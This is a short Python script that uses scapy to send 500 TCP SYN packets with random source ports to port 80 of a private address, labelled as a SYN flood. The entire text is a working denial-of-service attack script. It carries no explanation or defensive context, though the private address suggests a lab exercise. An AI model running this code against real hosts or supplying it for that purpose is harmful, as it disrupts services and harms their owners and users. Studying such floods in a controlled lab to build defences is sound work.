from scapy.all import *
import time

victim_ip = "10.5.0.20"
victim_port = 80

print("Starting SYN Flood...")
for i in range(500):
    ip = IP(dst=victim_ip)
    tcp = TCP(dport=victim_port, flags="S", sport=RandShort())
    send(ip/tcp, verbose=0)
    time.sleep(0.01)

print("SYN Flood Complete.")
